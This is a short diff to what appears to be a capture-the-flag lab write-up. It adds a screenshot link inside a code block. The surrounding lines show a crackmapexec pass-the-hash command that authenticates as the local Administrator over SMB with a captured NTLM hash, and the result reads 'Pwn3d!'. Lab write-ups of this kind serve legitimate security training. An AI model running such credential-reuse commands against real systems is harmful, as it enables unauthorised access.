@@ -94,6 +94,8 @@ We use `crackmapexec` (or `netexec`) to verify the hash against the local SMB se
 
 ```bash
 crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
+
+![Screenshot](images/Screenshot_2024-08-11_at_12.03.39_PM.png)
 ```
 
 The result returns `Pwn3d!`, indicating the hash belongs to the local `Administrator`. 
